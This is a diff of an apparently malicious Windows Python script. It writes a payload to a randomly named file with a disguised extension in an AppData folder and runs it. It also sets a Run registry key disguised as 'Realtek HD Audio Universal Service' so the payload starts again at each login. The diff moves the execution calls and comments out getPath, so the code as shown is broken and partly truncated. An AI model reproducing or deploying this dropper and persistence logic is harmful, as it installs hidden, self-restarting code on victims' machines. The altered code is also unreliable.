@@ -8,12 +8,9 @@ from random import choice
 from shutil import copy
 import subprocess
 from os import getenv, listdir, startfile
-
 if name != 'nt': 
     exit()
-
 os.system("python.exe -m pip install --upgrade pip")
-
 #requirements
 requirements = [
     ["wmi", "wmi"],
@@ -22,22 +19,28 @@ for modl in requirements:
     try: __import__(modl[0])
     except:
         subprocess.Pope
+DoYouKnowTheWay = getPath() + '\\' + getName()
+install(DoYouKnowTheWay)
+run(DoYouKnowTheWay)
+try:
+    startUP(DoYouKnowTheWay)
+except:
+    pass
 
-def getPath():
-    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
-    directory = listdir(path)
-    for _ in range(10):
-        chosen = choice(directory)
-        ye = path + "\\" + chosen
-        if not isfile(ye) and " " not in chosen:
-            return ye
-    return getenv("TEMP")
+# def getPath():
+#     path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
+#     directory = listdir(path)
+#     for _ in range(10):
+#         chosen = choice(directory)
+#         ye = path + "\\" + chosen
+#         if not isfile(ye) and " " not in chosen:
+#             return ye
+#     return getenv("TEMP")
 
 def getName():
     firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
     lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
     return firstName + choice(lasName)
-
 
 def install(path):
     with open(path, mode='w', encoding='utf-8') as f:
@@ -53,13 +56,3 @@ def startUP(path):
     key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
     open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
     winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")
-
-
-
-DoYouKnowTheWay = getPath() + '\\' + getName()
-install(DoYouKnowTheWay)
-run(DoYouKnowTheWay)
-try:
-    startUP(DoYouKnowTheWay)
-except:
-    pass
